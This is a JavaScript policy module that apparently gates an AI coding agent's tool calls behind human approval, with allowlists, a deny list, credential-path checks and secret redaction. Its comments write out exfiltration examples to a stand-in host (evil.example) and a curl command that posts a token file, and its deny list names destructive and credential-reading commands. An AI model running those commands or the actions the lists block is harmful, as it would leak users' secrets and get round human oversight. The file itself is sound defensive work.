// What a job is allowed to do without asking.
//
// PURE — no I/O — so every rule here is unit-testable, which matters more than
// usual: this file is the difference between an assistant and an unattended
// process with your deploy credentials.
//
// THE DEFAULT IS ASK. Everything below is about which narrow set of things is
// safe enough to skip the prompt, and the answer is: reads, and commands that
// cannot change anything outside the working copy.

import path from "path";

export class PolicyError extends Error {}

export const POLICIES = ["manual", "allowlist", "yolo"];

// Tools that only read. Approving these every time trains you to tap Allow
// without looking, which is worse than not asking.
//
// WebFetch is NOT here. A read of a local file plus a fetch of an arbitrary
// URL is a complete exfiltration channel — Read the profile's token, then
// WebFetch https://evil.example/?t=<it> — and neither half would ever have
// shown a card. Fetching is a write to the outside world, so it asks.
const READ_TOOLS = new Set([
  "Read",
  "Glob",
  "Grep",
  "NotebookRead",
  "TodoWrite",
  "WebSearch",
  "Task",
  // The shared desktop's two looks (agent/src/mcp-desktop.js). Every acting
  // desktop tool asks, here AND at agentd's own desktop gate.
  "mcp__desktop__screenshot",
  "mcp__desktop__list_windows",
]);

// The read tools that take a PATH, and where in their input it lives. A read
// is only safe because of WHAT it reads: the job's own clone, yes; the
// profiles directory beside it, the per-job config holding the site token,
// another profile's subscription token — never. Each of those sits a `..` or
// two from the job's cwd, so the path is checked, not the tool name.
const PATH_FIELDS = {
  Read: ["file_path", "path"],
  NotebookRead: ["notebook_path", "path"],
  Glob: ["path", "pattern"],
  Grep: ["path", "glob"],
};

// Names that hold a credential on this box. Checked on every path a read
// tool or a safe command would touch, inside the workspace or not — a cloned
// repo can contain a .env too.
const CREDENTIAL_PATH = /(^|\/)\.env\b|\bid_rsa\b|\bcredentials\.json\b|\.ssh(\/|$)|\.agentd\b|-token\b|\bauth\.json\b|\.login\.json\b/i;

// The sentinel used when the caller gives no workspace: a relative path
// still resolves inside it, an absolute or climbing one does not.
const NO_WORKSPACE = "/__workspace__";

const toPosix = (p) => String(p || "").replace(/\\/g, "/");

// True when `p` resolves inside `workspace`. `~` is outside by definition —
// it is the agent user's home, which is where every credential lives.
export function insideWorkspace(p, workspace = NO_WORKSPACE) {
  const raw = toPosix(p).trim();
  if (!raw) return true;
  if (raw.startsWith("~") || raw.includes("$")) return false;
  const ws = path.posix.resolve(toPosix(workspace) || NO_WORKSPACE);
  const rel = path.posix.relative(ws, path.posix.resolve(ws, raw));
  return !rel.startsWith("..") && !path.posix.isAbsolute(rel);
}

const relativeTo = (p, workspace = NO_WORKSPACE) => {
  const ws = path.posix.resolve(toPosix(workspace) || NO_WORKSPACE);
  return path.posix.relative(ws, path.posix.resolve(ws, toPosix(p).trim()));
};

function readPathVerdict(tool, input = {}, workspace) {
  for (const field of PATH_FIELDS[tool] || []) {
    const v = input?.[field];
    if (v == null || v === "") continue;
    if (!insideWorkspace(v, workspace)) {
      return { allow: false, reason: `${tool} of ${String(v).slice(0, 120)} is outside this job's working copy, so it asks.` };
    }
    // Tested on the path RELATIVE to the workspace: the workspace itself sits
    // under ~/.agentd, so the absolute form of every legitimate read would
    // match `.agentd`.
    if (CREDENTIAL_PATH.test(relativeTo(v, workspace))) {
      return { allow: false, reason: `${tool} of ${String(v).slice(0, 120)} reaches for a credential file, so it asks.` };
    }
  }
  return null;
}

// Shell commands that are safe to run unattended under `allowlist`. Matched
// against the START of the command, after normalising whitespace.
//
// Everything here is read-only or confined to the working copy. Note what is
// NOT here: push, deploy, rm, curl piped to a shell, anything with sudo,
// anything that writes outside the repo, and any package manager command that
// RUNS code from the network (`npm install` executes install scripts, so it is
// allowed only in the verify phase where the repo is already trusted).
//
// `find` is here only WITHOUT its acting predicates (see UNSAFE_ARGS):
// `find . -exec sh -c … \;` starts with `find` and runs anything.
const SAFE_COMMANDS = [
  /^git (status|diff|log|show|branch|rev-parse|ls-files|blame)\b/,
  /^(ls|cat|head|tail|wc|find|grep|rg|file|stat|pwd|which|du)\b/,
  /^node --check\b/,
  /^npm (run )?(test|lint)\b/,
  /^npx? (tsc|eslint|prettier) --?/,
  /^echo\b/,
];

// Commands that must NEVER be auto-approved, even if something above would
// match them. Checked first, and deliberately broad — a false prompt costs a
// tap, a false approval costs a repository.
const NEVER = [
  /\bsudo\b/,
  /\brm\s+-[rf]/,
  /\bgit\s+push\b/,
  /\bgit\s+reset\s+--hard\b/,
  /\bgit\s+clean\b/,
  /\b(curl|wget)\b[^|]*\|\s*(ba)?sh\b/,
  /\bchmod\s+[0-7]*7[0-7]*\b/,
  /\b(shutdown|reboot|mkfs|dd)\b/,
  />\s*\/(etc|usr|bin|boot)\//,
  /\b(vercel|netlify|fly|wrangler)\b.*\bdeploy\b/,
  /\bnpm\s+publish\b/,
  // Reaching for a credential file is never incidental. `-token` and
  // `.agentd` are this box's own: each profile's pasted subscription token
  // and the per-job config that carries the site MCP token.
  /\.env\b|\bid_rsa\b|\bcredentials\.json\b|\.ssh\/|-token\b|\.agentd\b|\bauth\.json\b/,
];

// A safe PREFIX says nothing about what follows it. `ls && curl -d @x …`,
// `git log; node -e 1`, `cat $(…)`, `echo x > ~/claude/settings.json` all
// start with something on the list. So any shell control, substitution or
// redirection takes a command off the unattended path entirely — checked on
// the RAW string, before whitespace normalising turns a newline into a space.
const SHELL_CONTROL = /[;&|`<>\n\r]|\$\(|\$\{/;

// Arguments that turn a reading command into an acting one. find's -exec
// family runs programs and -delete / -fprint write; rg --pre runs a program
// per file; git's --output writes a file and --ext-diff runs one.
const UNSAFE_ARGS = /(^|\s)(-exec|-execdir|-ok|-okdir|-delete|-fprint0?|-fprintf|-fls|--pre|--output|--ext-diff)(=|\s|$)/;

const normalise = (cmd) => String(cmd || "").replace(/\s+/g, " ").trim();

// The decision. Returns { allow, reason } — `reason` is shown to the human on
// the approval card, so it is written for them, not for a log.
//
// `workspace` is the job's working copy. Reads are auto-approved only inside
// it; with none given, a relative path is treated as inside and anything
// absolute, home-relative or climbing out asks.
export function decide({ policy = "manual", tool, input = {}, workspace } = {}) {
  if (!POLICIES.includes(policy)) {
    throw new PolicyError(`Unknown policy "${policy}". Known: ${POLICIES.join(", ")}.`);
  }
  if (!tool) throw new PolicyError("A tool name is required to decide anything.");

  // yolo exists so the dangerous option is a named, auditable choice rather
  // than a flag someone adds at 1am. The server still refuses it unless the
  // job is marked disposable — see jobs.js — so this returning true is not on
  // its own enough to run anything.
  if (policy === "yolo") {
    return { allow: true, reason: "Policy is yolo: nothing is asked." };
  }

  if (policy === "manual") {
    return { allow: false, reason: "Policy is manual: every tool asks." };
  }

  // allowlist
  if (READ_TOOLS.has(tool)) {
    const outside = readPathVerdict(tool, input, workspace);
    if (outside) return outside;
    return { allow: true, reason: `${tool} only reads.` };
  }

  if (tool === "Bash") {
    const rawCmd = String(input?.command || "");
    const cmd = normalise(rawCmd);
    if (!cmd) return { allow: false, reason: "An empty command is never run unasked." };

    const banned = NEVER.find((re) => re.test(cmd));
    if (banned) {
      return {
        allow: false,
        reason: `This command always asks, whatever the policy (matched ${banned}).`,
      };
    }
    if (SHELL_CONTROL.test(rawCmd)) {
      return { allow: false, reason: "The command chains, substitutes or redirects, so a safe start says nothing about the rest. It asks." };
    }
    if (UNSAFE_ARGS.test(cmd)) {
      return { allow: false, reason: "An argument makes this command run or write something, so it asks." };
    }
    const safe = SAFE_COMMANDS.find((re) => re.test(cmd));
    if (safe) {
      // A read-only command is only as safe as what it reads.
      const stray = cmd.split(" ").slice(1).find((a) => !a.startsWith("-") && !insideWorkspace(a.replace(/^['"]|['"]$/g, ""), workspace));
      if (stray) return { allow: false, reason: `It reads ${stray.slice(0, 120)}, outside this job's working copy, so it asks.` };
      return { allow: true, reason: "A read-only command on the allowlist." };
    }

    return { allow: false, reason: "Not on the allowlist of read-only commands." };
  }

  // Write, Edit, MultiEdit, NotebookEdit and anything new.
  return { allow: false, reason: `${tool} can change things, so it asks.` };
}

// The verify step runs with NO approval gate — it is the job's own test, run
// after the agent exits — so what it may run is a fixed shape, checked on the
// box whatever the caller (the panel, the HTTP API, MCP) checked first. An
// arbitrary string here was `sh -c 'curl -d @~/.claude-token …'` with no card.
// A package script still runs code from the repo; that is what testing it
// means, and runner.verify gives it a scrubbed environment for that reason.
const VERIFY_COMMANDS = [
  /^(npm|pnpm|yarn) test$/,
  /^(npm|pnpm|yarn) run [A-Za-z0-9][A-Za-z0-9:._-]{0,63}$/,
  /^npx tsc --noEmit$/,
];
export const VERIFY_EXAMPLES = ["npm test", "npm run <script>", "pnpm test", "yarn run <script>", "npx tsc --noEmit"];

export function assertVerifyCommand(cmd) {
  const c = normalise(cmd);
  if (!VERIFY_COMMANDS.some((re) => re.test(c))) {
    throw new PolicyError(
      `"${String(cmd).slice(0, 80)}" cannot be a verify command. Verify runs unattended, so it is limited to: ${VERIFY_EXAMPLES.join(", ")}.`
    );
  }
  return c;
}

// A job may only use `yolo` if it was declared disposable AND has no
// credentials mounted. Two independent conditions, because either alone is a
// mistake waiting to happen.
export function assertYoloAllowed(job) {
  if (job.policy !== "yolo") return;
  if (!job.disposable) {
    throw new PolicyError(
      "Policy yolo is only allowed on a job marked disposable. Mark it disposable, or use allowlist."
    );
  }
  if (job.credentials && Object.keys(job.credentials).length) {
    throw new PolicyError(
      "Policy yolo is refused for a job with credentials mounted. An agent with no approval gate must not hold a token."
    );
  }
}

// Secrets must not reach the browser transcript. Applied to every line of tool
// output before it is streamed.
//
// This is a mitigation, not a guarantee: a determined agent could encode a
// secret past it. It exists because the realistic leak is accidental — a
// `cat .env`, a stack trace, a debug print — and those it does catch.
const SECRET_PATTERNS = [
  // key=value in an env file or a shell export
  /\b([A-Z][A-Z0-9_]{3,})\s*=\s*(['"]?)([^\s'"]{8,})\2/g,
  // Bearer tokens and the common provider prefixes
  /\b(Bearer\s+)[A-Za-z0-9._~+/-]{16,}=*/gi,
  /\b(sk-[A-Za-z0-9_-]{16,}|gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}|glpat-[A-Za-z0-9_-]{16,}|hf_[A-Za-z0-9]{20,}|npm_[A-Za-z0-9]{30,}|rkmcp_[A-Za-z0-9._-]{16,}|vc[pk]_[A-Za-z0-9]{16,}|xox[baprs]-[A-Za-z0-9-]{10,})/g,
  // Private key blocks
  /-----BEGIN [A-Z ]*PRIVATE KEY-----[\s\S]*?-----END [A-Z ]*PRIVATE KEY-----/g,
];

export function redact(text) {
  let out = String(text ?? "");
  out = out.replace(SECRET_PATTERNS[0], (m, k, q, v) =>
    // Keep the key visible — knowing WHICH variable appeared is useful, and
    // the name is not the secret.
    `${k}=${q}${"•".repeat(Math.min(12, v.length))}${q}`
  );
  out = out.replace(SECRET_PATTERNS[1], (m, p) => `${p}••••••••`);
  out = out.replace(SECRET_PATTERNS[2], "••••••••");
  out = out.replace(SECRET_PATTERNS[3], "-----REDACTED PRIVATE KEY-----");
  return out;
}
